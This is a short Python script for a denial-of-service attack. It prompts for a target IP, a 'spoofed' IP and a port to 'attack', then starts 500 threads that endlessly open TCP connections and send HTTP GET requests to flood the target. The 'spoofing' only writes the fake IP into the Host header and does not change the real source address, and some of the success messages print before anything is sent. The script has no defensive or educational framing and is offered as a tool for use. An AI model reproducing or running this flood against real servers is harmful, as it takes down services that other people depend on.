import socket
import threading 
print("Enter IP address of the target: ")
print("To get the IP address, you can ping the domain in the terminal.")
target = input("\t == > ")
print("Enter the IP address that you wish to spoof: ")
fake_ip = input("\t\t ==> ")
print("Enter the port number you wish to attack: ")
port = input("\t\t ==> ")
port = int(port)
attack_num = 0
print("Sending packets...")
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))      
        global attack_num
        attack_num += 1
        packesnum =attack_num
        packesnum= str(packesnum)
        print("Packets Sending => "+packesnum)
        print("Done")  
        s.close()
print("Packets sent successfully!")
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
